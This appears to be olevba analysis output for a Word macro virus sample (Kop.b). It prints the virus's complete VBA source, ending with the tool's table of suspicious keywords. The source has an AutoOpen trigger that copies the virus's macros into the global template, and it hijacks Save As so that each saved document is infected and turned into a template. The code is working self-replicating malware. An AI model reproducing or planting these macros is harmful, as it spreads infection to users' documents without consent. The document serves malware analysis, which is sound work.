olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kop.b-d6ca2f3c61d2e5e6a9d73369b71a1c62d83007f5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kop.b-d6ca2f3c61d2e5e6a9d73369b71a1c62d83007f5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Kop.b-d6ca2f3c61d2e5e6a9d73369b71a1c62d83007f5 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
        WordBasic.Call "kopieren"
End Sub
-------------------------------------------------------------------------------
VBA MACRO kopieren.bas 
in file: Virus.MSWord.Kop.b-d6ca2f3c61d2e5e6a9d73369b71a1c62d83007f5 - OLE stream: 'Macros/VBA/kopieren'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Dim Fname$
    Dim MacName1$
    Dim MacName2$
    Dim MacName3$
    Fname$ = WordBasic.[FileName$]()
    MacName1$ = Fname$ + ":AutoOpen"
    MacName2$ = Fname$ + ":DateiSpeichernUnter"
    MacName3$ = Fname$ + ":kopieren"
    WordBasic.MacroCopy MacName1$, "Global:AutoOpen", 1
    WordBasic.MacroCopy MacName2$, "Global:DateiSpeichernUnter", 1
    WordBasic.MacroCopy MacName3$, "Global:kopieren", 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO DateiSpeichernUnter.bas 
in file: Virus.MSWord.Kop.b-d6ca2f3c61d2e5e6a9d73369b71a1c62d83007f5 - OLE stream: 'Macros/VBA/DateiSpeichernUnter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Dim Cnt
Dim Founded
    Dim dbox As Object: Set dbox = WordBasic.DialogRecord.FileSaveAs(False)         'define Dialog box
    WordBasic.CurValues.FileSaveAs dbox                 'initialize and run dialog box
    
    On Error GoTo -1: On Error GoTo Ende                    'Call Exception Handle "Exit"
    WordBasic.Dialog.FileSaveAs dbox
    If ((dbox.Format = 0) Or (dbox.Format = 1)) Then  'Save only Macros in                                                Files with the end                                                  *.dot, *.doc
            WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
            WordBasic.MacroCopy "Global:kopieren", WordBasic.[WindowName$]() + ":kopieren", 1
            WordBasic.MacroCopy "Global:DateiSpeichernUnter", WordBasic.[WindowName$]() + ":DateiSpeichernUnter", 1
            dbox.Format = 1                 'transform File in a                                                 template
            WordBasic.FileSaveAs dbox       'save the File
    End If
        
Ende:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

